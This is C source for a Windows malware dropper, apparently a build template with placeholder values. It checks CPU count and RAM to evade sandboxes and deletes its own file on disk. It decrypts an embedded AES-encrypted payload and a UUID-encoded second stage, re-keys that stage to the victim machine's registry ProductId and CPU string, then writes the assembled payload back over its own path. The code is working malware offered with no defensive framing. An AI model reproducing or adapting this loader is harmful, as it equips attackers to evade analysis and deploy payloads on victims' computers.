#define _UNICODE
#include <windows.h>
#include <string.h> 
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include "aes.c"

#define stage2strlen ST2LEN
BYTE origkey[ 16 ] = { AESKEY };
BYTE origiv[ 16 ] = { IVVALUE }; 

BYTE stage1[ SCLENGTH1 ] = { STAGE1 };
size_t s1length = sizeof(stage1);

unsigned char stage2[stage2strlen] =  "STAGE2";
size_t stage2binlen = (stage2strlen / 36) * 16;

//--------------------------------------memmemm doesn't exist on windows so custom implementation here-----------------------------------------
void* memmemm(const void* haystack, size_t haystackLen, const void* needle, size_t needleLen)
{
	//The first occurrence of the empty string is deemed to occur at the beginning of the string.
	if (needleLen == 0 || haystack == needle)
	{
		return (void*)haystack;
	}
	
	if (haystack == NULL || needle == NULL)
	{
		return NULL;
	}

	const unsigned char* haystackStart = (const unsigned char*)haystack;
	const unsigned char* needleStart = (const unsigned char*)needle;
	const unsigned char needleEndChr = *(needleStart + needleLen - 1);

	++haystackLen;
	for (; --haystackLen >= needleLen; ++haystackStart)
	{
		size_t x = needleLen;
		const unsigned char* n = needleStart;
		const unsigned char* h = haystackStart;

		/* Check for the first and the last character */
		if (*haystackStart != *needleStart ||
		    *(haystackStart + needleLen - 1) != needleEndChr)
		{
			continue;
		}

		while (--x > 0)
		{
			if (*h++ != *n++)
			{
				break;
			}
		}
		
		if (x == 0)
		{
			return (void*)haystackStart;
		}
	}

	return NULL;
}

unsigned int hash(const char* str)
{
	unsigned int hash = 2167;
	int c;
	while (c = *str++)
		hash = ((hash << 5) + hash) + c;
	return hash;
}

void GetKeyBase(char aeskey[], char iv[])
{
	//Get Processor Name
	int cpuInfo[4] = { -1 };
	char CPUBrandString[0x40];
	memset(CPUBrandString, 0, sizeof(CPUBrandString));
	__cpuid(cpuInfo, 0x80000002);
	memcpy(CPUBrandString, cpuInfo, sizeof(cpuInfo));
	__cpuid(cpuInfo, 0x80000003);
	memcpy(CPUBrandString + 16, cpuInfo, sizeof(cpuInfo));
	__cpuid(cpuInfo, 0x80000004);
	memcpy(CPUBrandString + 32, cpuInfo, sizeof(cpuInfo));

	int AccessMask;
	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	//If we are on x86 machine
	if (systemInfo.wProcessorArchitecture == 0)
	{
		AccessMask = KEY_QUERY_VALUE;
	}
	//Otherwise we are on x64
	else
	{
		GetSystemInfo(&systemInfo);
		//If process is x86
		if (systemInfo.wProcessorArchitecture == 0)
		{
			AccessMask = KEY_QUERY_VALUE | KEY_WOW64_64KEY;
		}
		//Otherwise x64
		else
		{
			AccessMask = KEY_QUERY_VALUE;
		}
	}
	char subkey[] = { 'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r','o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', '\0' };
	char regval[] = { 'P', 'r', 'o', 'd', 'u', 'c', 't', 'I', 'd', '\0' };
	char value[255];
	char shash[16];
	char assembleiv[17];
	int i;
	HKEY key = NULL;
	DWORD BufferSize = 255;

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, AccessMask, &key);
	RegGetValueA(key, "", regval, RRF_RT_ANY, NULL, &value, &BufferSize);
	RegCloseKey(key);
	strcat(value, CPUBrandString);
	sprintf(shash, "%u", hash(value));

	int keylen = strlen(shash);
	int remainder = 16 - keylen;

	//Assemble IV
	strncpy(assembleiv, shash, keylen);
	for (i = 0; i < remainder; i++)
	{
		assembleiv[keylen + i] = '0';
	}
	assembleiv[keylen + remainder] = '\0';
	sprintf(iv, "%s", strrev(assembleiv));

	//Assemble Key
	strncpy(aeskey, shash, keylen);
}

void deleteme() 
{
    WCHAR wcPath[MAX_PATH + 1];
    RtlSecureZeroMemory(wcPath, sizeof(wcPath));

    // get the path to the current running process ctx
    GetModuleFileNameW(NULL, wcPath, MAX_PATH);

    HANDLE hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // rename the associated HANDLE's file name
    FILE_RENAME_INFO *fRename;
    LPWSTR lpwStream = L":gone";
    DWORD bslpwStream = (wcslen(lpwStream)) * sizeof(WCHAR);

    DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
    fRename = (FILE_RENAME_INFO *)malloc(bsfRename);
    memset(fRename, 0, bsfRename);
    fRename->FileNameLength = bslpwStream;
    memcpy(fRename->FileName, lpwStream, bslpwStream);
    //printf("bsfRename: %d; FileNameLength: %d; FileName: %ls\n", bsfRename, fRename->FileNameLength, fRename->FileName);
    SetFileInformationByHandle(hCurrent, FileRenameInfo, fRename, bsfRename);
    CloseHandle(hCurrent);

    // open another handle, trigger deletion on close
    hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // set FILE_DISPOSITION_INFO::DeleteFile to TRUE
    FILE_DISPOSITION_INFO fDelete;
    RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
    fDelete.DeleteFile = TRUE;
    SetFileInformationByHandle(hCurrent, FileDispositionInfo, &fDelete, sizeof(fDelete));

    // trigger the deletion deposition on hCurrent
    CloseHandle(hCurrent);   
}

BOOL Evade()
{
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	if (systemInfo.dwNumberOfProcessors < 2)
	{
		return FALSE;
	}
	//Check amount of RAM for sandbox evasion
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	if (memoryStatus.ullTotalPhys / 1024 / 1024 < 2048)
	{
		return FALSE;
	}
	return TRUE;
}

void MyWriteFile(const char* filename, unsigned char* buffer, long bufflen)
{
	FILE* fileptr;
	fileptr = fopen(filename, "wb");  // Open the file in binary mode
	fwrite(buffer, 1, bufflen, fileptr);
	fclose(fileptr); // Close the file
}

int main()
{
	//Sandbox evasion
	if(!Evade())
		return 0;

	//Initialize vars
	char iv[16];
	char aeskey[] = {'0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'};

	//First action is to delete Stage0 from disk to clear way for Stage1 to be written in it's place.  Note that this will not overwrite the same disk sectors, just place the file in the same location in the file system.
    deleteme();

    //Decrypt stage 1 using original AES key/iv
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, origkey, origiv);
    AES_CTR_xcrypt_buffer(&ctx, stage1, s1length);


	//Format stage2 to uuids and then read into buffer for decryption/re-encryption
	unsigned char* ha = (unsigned char*)malloc(stage2binlen * sizeof(unsigned char)); // Enough memory for the file
	DWORD_PTR hptr = (DWORD_PTR)ha;

	//Calculate number of uuids that stage2 comprises
	int elems = stage2strlen / 36;

	//Initialize vars
	int count;
	int place = 0;
	char temp[37];

	//Transform stage2 string into uuids and then use UuidFromStringA in order to turn into binary and store in allocated heap memory
	for (int i = 0; i < elems; i++) {
		for (count = 0; count < 36; count++)
		{
			memcpy(temp + count, stage2 + place + count, 1);
		}
		//Null terminate temp string
		memcpy(temp + 36, "\0x00", 1);
		//increment uuid buffer location
		place = place + 36;
		//Convert UUID in temp to binary
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)temp, (UUID*)hptr);
		//Increment heap buffer
		hptr += 16;
	}

    //Decrypt stage 2 using original AES key/iv
    AES_init_ctx_iv(&ctx, origkey, origiv);
    AES_CTR_xcrypt_buffer(&ctx, ha, stage2binlen);

	//Gen new AES keys based on victim info
    GetKeyBase(aeskey, iv);

	//re-encrypt stage 2 with new keys
    AES_init_ctx_iv(&ctx, aeskey, iv);
    AES_CTR_xcrypt_buffer(&ctx, ha, stage2binlen);

	//Allocate memory and define variables
    unsigned char* uuidbuf = (unsigned char*)malloc(stage2strlen * sizeof(unsigned char));
    unsigned char uuid[36];
    int scoffset = 0;
    count = 0;
    int j;

    //Convert completed stage2 to one giant string of uuid's. Uuid's are mixed-endian; First 3 "octets" are little-endian while last 2 are big-endian.
    for (int i=0; i<elems; i++) 
    {          
        sprintf(uuid, "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X", ha[scoffset+3], ha[scoffset+2], ha[scoffset+1], ha[scoffset], ha[scoffset+5], ha[scoffset+4], ha[scoffset+7], ha[scoffset+6], ha[scoffset+8], ha[scoffset+9], ha[scoffset+10], ha[scoffset+11], ha[scoffset+12], ha[scoffset+13], ha[scoffset+14], ha[scoffset+15]);
        for(int j = 0; uuid[j]; j++)
        {
            uuid[j] = tolower(uuid[j]);
        }
        memcpy(uuidbuf + count, uuid, 36);
        count = count + 36;
        scoffset = scoffset + 16;
    }
    printf("Stage2 Complete!\n\n");


//------------------------------Build Stage 1--------------------------------

    //Binary patch.  Find uuidneedle in stage1 and replace with completed stage2
    unsigned char uuidneedle[8] = {0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44};
	size_t needlelen = sizeof(uuidneedle);
    unsigned char *s = memmemm(stage1, s1length, uuidneedle, needlelen); 
    int position = s - stage1;
    int remainder = s1length - position - stage2strlen;

    //Initialize buffer to hold final stage1
    unsigned char* stage1final = (unsigned char*)malloc(s1length * sizeof(unsigned char));

	//Assemble final stage1 with victim-encrypted stage2
    memcpy(stage1final, stage1, position); // Bytes before placeholder
    memcpy(stage1final + position, uuidbuf, stage2strlen); //Patch in stage2
    memcpy(stage1final + position + stage2strlen, stage1 + position + stage2strlen, remainder); //add rest of payload

	//Write final stage1 to disk in same location as stage0
	CHAR cPath[MAX_PATH + 1];
	RtlSecureZeroMemory(cPath, sizeof(cPath));
	GetModuleFileNameA(NULL, cPath, MAX_PATH);
    MyWriteFile(cPath, stage1final, s1length);
}
